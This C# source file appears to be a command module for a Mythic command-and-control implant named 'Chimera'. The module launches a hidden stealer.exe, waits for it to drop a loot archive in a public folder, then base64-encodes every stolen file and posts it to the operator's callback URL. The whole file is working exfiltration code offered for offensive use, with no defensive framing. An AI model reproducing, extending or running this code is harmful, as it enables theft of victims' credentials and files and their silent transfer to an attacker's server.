using System;
using System.IO;
using System.Net;
using System.Text;
using Newtonsoft.Json;

namespace Chimera.Commands
{
    // StealerExfil — runs stealer.exe, waits for it to finish,
    // then auto-uploads the loot zip to Mythic so it appears in
    // "Recently Downloaded Files" without operator intervention.
    public static class StealerExfil
    {
        // Loot zip drop path — stealer.exe must save here
        private static readonly string LootDir       = @"C:\Users\Public\loot";
        private static readonly string StealerExePath = @"C:\Users\Public\stealer.exe";

        public static string Execute(string taskID, string callbackUUID)
        {
            try
            {
                // 1 — Make sure loot dir exists
                Directory.CreateDirectory(LootDir);

                // 2 — Run stealer.exe, wait up to 60s
                if (!File.Exists(StealerExePath))
                    return "[error] stealer.exe not found at " + StealerExePath;

                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName        = StealerExePath,
                    WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden,
                    CreateNoWindow  = true,
                    UseShellExecute = false
                };
                var proc = System.Diagnostics.Process.Start(psi);
                if (proc != null) proc.WaitForExit(60000);

                // 3 — Find the zip stealer dropped
                string[] zips = Directory.GetFiles(LootDir, "*.zip");
                if (zips.Length == 0)
                    zips = Directory.GetFiles(LootDir);
                if (zips.Length == 0)
                    return "stealer ran but no loot files found in " + LootDir;

                // 4 — Upload each file via chunked download response
                var results = new StringBuilder();
                foreach (string lootFile in zips)
                {
                    string fname = Path.GetFileName(lootFile);
                    byte[] data  = File.ReadAllBytes(lootFile);
                    string b64   = Convert.ToBase64String(data);

                    string json = string.Format(
                        "{{\"action\":\"post_response\",\"responses\":[{{" +
                        "\"task_id\":\"{0}\"," +
                        "\"download\":{{\"total_chunks\":1,\"chunk_num\":1," +
                        "\"chunk_data\":\"{1}\",\"full_path\":\"{2}\"," +
                        "\"is_screenshot\":false}}}}]}}",
                        taskID, b64, lootFile.Replace("\\", "\\\\"));

                    PostToMythic(json);
                    results.AppendLine("uploaded: " + fname + " (" + data.Length / 1024 + " KB)");
                }

                return results.ToString().Trim();
            }
            catch (Exception ex)
            {
                return "error: " + ex.Message;
            }
        }

        private static void PostToMythic(string json)
        {
            try
            {
                byte[] body = Encoding.UTF8.GetBytes(json);
                var wc = new WebClient();
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.Headers["User-Agent"] = Config.UserAgent;
                wc.UploadData(Config.CallbackURL, "POST", body);
            }
            catch { }
        }
    }
}
